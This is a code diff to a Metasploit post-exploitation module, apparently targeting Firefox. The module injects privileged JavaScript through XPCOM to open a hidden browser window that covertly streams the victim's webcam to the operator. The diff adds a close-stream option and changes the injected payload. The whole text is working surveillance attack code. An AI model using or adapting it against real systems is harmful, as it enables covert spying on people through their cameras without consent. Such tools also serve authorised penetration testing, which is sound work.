@@ -36,9 +36,15 @@ class Metasploit3 < Msf::Post
 
     result = js_exec(js_payload(server, offerer_id, channel))
 
-    if result.present?
-      print_status result
-      connect_video_chat(server, channel, offerer_id)
+    if datastore['CLOSE']
+      print_status "Stream closed."
+    else
+      if result.present?
+        print_status result
+        connect_video_chat(server, channel, offerer_id)
+      else
+        print_warning "No response received"
+      end
     end
   end
 
@@ -63,23 +69,21 @@ class Metasploit3 < Msf::Post
     end
 
     %Q|
-    (function(send){
-      try {
-        var b64 = Components.utils.import("resource://gre/modules/Services.jsm").atob;
-        var AppShellService = Components
-           .classes["@mozilla.org/appshell/appShellService;1"]
-           .getService(Components.interfaces.nsIAppShellService);
+      (function(send){
+        try {
+          var AppShellService = Components
+             .classes["@mozilla.org/appshell/appShellService;1"]
+             .getService(Components.interfaces.nsIAppShellService);
 
-        var html = "#{Rex::Text.encode_base64(interface)}";
-        var url = "data:text/html;base64,"+html;
-        AppShellService.hiddenDOMWindow.open(url, "_self");
-        AppShellService.hiddenDOMWindow.moveTo(-55555,-55555);
-        send("Streaming webcam...");
-      } catch (e) {
+          var html = "#{Rex::Text.encode_base64(interface)}";
+          var url = #{url};
+          var win = AppShellService.hiddenDOMWindow.open(url, "_self", "width=500,height=500");
+          send("Streaming webcam...");
+        } catch (e) {
           send(e);
         }
       })(send);
-    |.gsub(/\s+/, '')
+    |
   end
 
 end
